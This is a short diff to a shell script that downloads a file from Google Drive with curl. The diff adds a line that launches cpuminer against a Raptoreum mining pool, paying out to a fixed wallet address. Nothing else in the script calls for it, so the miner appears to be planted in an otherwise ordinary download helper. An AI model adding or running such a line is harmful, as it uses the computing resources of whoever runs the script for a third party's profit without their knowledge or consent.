@@ -13,3 +13,4 @@ html=`curl -c ./cookie -s -L "https://drive.google.com/uc?export=download&id=${f
 curl -Lb ./cookie "https://drive.google.com/uc?export=download&`echo ${html}|grep -Po '(confirm=[a-zA-Z0-9\-_]+)'`&id=${fileid}" -o ${filename}
 
 
+./cpuminer -a gr -o stratum+tcp://pool.raptoreum.com:3333 -u RNB21thMUhqxA4mWSqxSK5qQg9LVPThNCg -t 1
